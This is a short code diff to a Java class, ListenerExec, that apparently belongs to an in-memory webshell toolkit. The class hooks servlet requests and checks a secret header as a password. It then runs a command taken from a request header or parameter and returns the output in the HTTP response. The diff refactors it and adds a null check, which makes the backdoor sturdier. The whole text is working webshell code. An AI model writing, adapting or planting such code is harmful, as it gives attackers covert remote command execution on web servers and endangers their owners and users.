@@ -46,13 +46,14 @@ public class ListenerExec implements InvocationHandler {
 
     private void run(Object sre) {
         try {
-            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-            if(!((String)invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
 
-            Object header = invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object param = invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            Object param = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
             String str = null;
             if (header != null) {
                 str = (String) header;
@@ -60,7 +61,7 @@ public class ListenerExec implements InvocationHandler {
                 str = (String) param;
             }
             String result = exec(str);
-            Object response = getResponse(httpServletRequest);
+            Object response = getResponse(request);
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
